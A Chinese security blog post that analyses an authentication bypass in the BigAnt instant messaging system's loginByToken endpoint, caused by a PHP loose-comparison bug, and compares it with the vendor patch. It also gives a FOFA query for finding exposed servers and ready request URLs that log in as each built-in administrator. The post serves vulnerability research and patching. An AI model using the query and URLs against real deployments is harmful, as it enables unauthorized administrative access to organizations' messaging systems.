---
title: "大蚂蚁 (BigAnt) 即时通讯系统 loginByToken 逻辑错误至权限绕过漏洞"
source: https://mrxn.net/jswz/bigant-loginByToken-authbypass.html
asset_dir: assets/大蚂蚁-(bigant)-即时通讯系统-loginbytoken-逻辑错误至权限绕过漏洞
---

# 大蚂蚁 (BigAnt) 即时通讯系统 loginByToken 逻辑错误至权限绕过漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/2/6 13:22
* 453浏览
* [0评论](#comment)
* 22分钟阅读

深入探索

鉴权

认证

验证


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

杭州九麒科技大蚂蚁 (BigAnt) 即时通讯系统是一款企业级IM通信管理系统，提供多种功能支持。该系统的 loginByToken 接口存在逻辑错误，可导[致权限绕](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)过以任意用户身份登录进系统，从而造成系统敏感信息[泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)，甚至系统权限丢失。

短信和即时消息

# 影响版本

BigAnt 5.5.x 及以上版本用户

[![大蚂蚁 (BigAnt) 即时通讯系统 loginByToken 逻辑错误至权限绕过漏洞](images/img-001-f1b9c6e060ae.png)](https://image.mrxn.net/c60a23ed151548d39353341b023ebcc8.png)

经过测试，最新版本 6.0.1.20250407.1 也受影响

漏洞预警服务

深入探索

编码转换工具

云安全解决方案

网络安全培训

# fofa语法

> (body="/Public/static/admin/admin\_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"

# 漏洞分析

这个漏洞是在分析官方补丁的时候发现的，还记得上一篇文章 [大蚂蚁 (BigAnt) 即时通讯系统 upload\_file 任意文件上传漏洞](https://mrxn.net/jswz/bigant-upload_file-rce.html) 提到的补丁文件部分除了上传漏洞的DispersedAddinController，另一个就是本次漏洞的主角 Application/Home/Controller/LoginController.class.php，我对比了补丁和安装的最新版本发现差异如下

[![大蚂蚁 (BigAnt) 即时通讯系统 loginByToken 逻辑错误至权限绕过漏洞](images/img-002-9407080f901b.webp)](https://image.mrxn.net/394e7d8572b34b3488f77d62e23a9b07.webp)

原本如下逻辑代码

```
$isok= D("Common/AppCenter")->checkToken($uid,$token);
if(!$isok){
        die(json_encode(sp_api_fail(ERR_OP_ERR, "token 效验失败", JSON_UNESCAPED_UNICODE))) ;
}
```

深入探索

网页浏览器

Web安全书籍

漏洞扫描服务

补丁修改成如下逻辑

```
$res= D("Common/AppCenter")->checkToken($uid,$token);
if($res!==true){
    die(json_encode(sp_api_fail(ERR_OP_ERR, "token 效验失败", ),JSON_UNESCAPED_UNICODE)) ;
}
```

其中有两处非常重要的改变在比较部分，这是一个典型的 PHP 类型混淆（Type Juggling）[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

`!$isok` 使用松散类型判断，以下情况都会被认为是"验证通过"：

网络安全

```
$isok = "error";      // !"error" = false → 验证通过 ❌
$isok = 1;            // !1 = false → 验证通过 ❌
$isok = ["data"];     // !["data"] = false → 验证通过 ❌
$isok = "0";          // !"0" = true → 验证失败（但逻辑可能不符预期）
```

如果 `checkToken()` 返回错误信息字符串或其他非布尔值，攻击者可能[绕过验证](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)。

跟进 `checkToken()` 方法看下

[![大蚂蚁 (BigAnt) 即时通讯系统 loginByToken 逻辑错误至权限绕过漏洞](images/img-003-b1c05b37aa52.webp)](https://image.mrxn.net/0b86f8e923744387aebbf7dde119f4e2.webp)

只有成功验证才会返回true,可以正确进行比较，返回其他字符串都会导致比较被绕过，从而导致[鉴权绕过](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)。

```
$isok = D("Common/AppCenter")->checkToken($uid, $token);
if (!$isok) {
    die(...);  // 验证失败
}
// 继续执行（验证通过）
```

**PHP 类型转换规则**：非空字符串在布尔上下文中为 `true`

```
// 验证失败时
$isok = " uid xxx token 传入参数为空";  // 返回错误信息字符串
!$isok = !"非空字符串" = !true = false

if (false) {  // 条件不成立
    die(...);  // ❌ 不会执行
}
// ✅ 继续执行 → 认证被绕过！
```

因此攻击者只需发送**任意请求**（甚至不需要提供 token），就能[绕过认证](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)，所有验证失败的情况都会返回字符串 → `!字符串` = `false` → **绕过认证。**

网络安全

而补丁使用`if($res !== true)`

使用 `!==`（严格不等于）确保：

* **只有**当 `$res` 是**布尔值** **`true`** 时才通过验证
* 任何其他值（`false`、`null`、字符串、数组等）都会触发失败

在进行安全相关的布尔判断时，**始终使用严格比较**（`===` 或 `!==`）才是最佳实践！

# 漏洞复现

以下系统内置四种管理用户都可直接登录

系统管理员

* /home/login/loginByToken?uid=1&token=asdasdasdadasadad

安全管理员

* /home/login/loginByToken?uid=2&token=asdasdasdadasadad

审计管理员

安全运维咨询

* /home/login/loginByToken?uid=3&token=asdasdasdadasadad

超级管理员

* /home/login/loginByToken?uid=4&token=asdasdasdadasadad

[![大蚂蚁 (BigAnt) 即时通讯系统 loginByToken 逻辑错误至权限绕过漏洞](images/img-004-ba9405918a80.gif)](https://image.mrxn.net/d705e822df064af38d072c2470657881.gif)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#php](https://mrxn.net/tag/php)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#权限绕过](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)
* [#泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[大蚂蚁 (BigAnt) 即时通讯系统 loginByToken 逻辑错误至权限绕过漏洞](https://mrxn.net/jswz/bigant-loginByToken-authbypass.html)  
文章链接：<https://mrxn.net/jswz/bigant-loginByToken-authbypass.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞预警服务

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/bigant-loginByToken-authbypass.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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